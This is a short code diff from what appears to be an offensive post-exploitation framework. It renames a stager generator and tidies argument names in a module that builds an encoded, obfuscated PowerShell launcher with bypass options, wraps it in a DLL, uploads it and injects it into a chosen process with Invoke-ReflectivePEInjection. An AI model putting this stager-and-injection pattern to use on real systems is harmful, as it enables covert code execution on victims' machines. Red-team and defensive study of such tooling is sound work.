@@ -53,15 +53,15 @@ class Module:
             return handle_error_message(f"[!] Invalid listener: {listener_name}")
 
         # generate the PowerShell one-liner with all of the proper options set
-        launcher = main_menu.stagers.generate_launcher(
+        launcher = main_menu.stagergenv2.generate_launcher(
             listener_name,
             language="powershell",
             encode=True,
             obfuscate=launcher_obfuscate,
             obfuscation_command=launcher_obfuscate_command,
-            userAgent=user_agent,
+            user_agent=user_agent,
             proxy=proxy,
-            proxyCreds=proxy_creds,
+            proxy_creds=proxy_creds,
             bypasses=params["Bypasses"],
         )
 
@@ -71,8 +71,8 @@ class Module:
         launcher_code = launcher.split(" ")[-1]
 
         script_end += f"Invoke-ReflectivePEInjection -PEPath {full_upload_path} -ProcName {proc_name} "
-        dll = main_menu.stagers.generate_dll(launcher_code, arch)
-        upload_script = main_menu.stagers.generate_upload(dll, full_upload_path)
+        dll = main_menu.stagergenv2.generate_dll(launcher_code, arch)
+        upload_script = main_menu.stagergenv2.generate_upload(dll, full_upload_path)
 
         script += "\r\n"
         script += upload_script
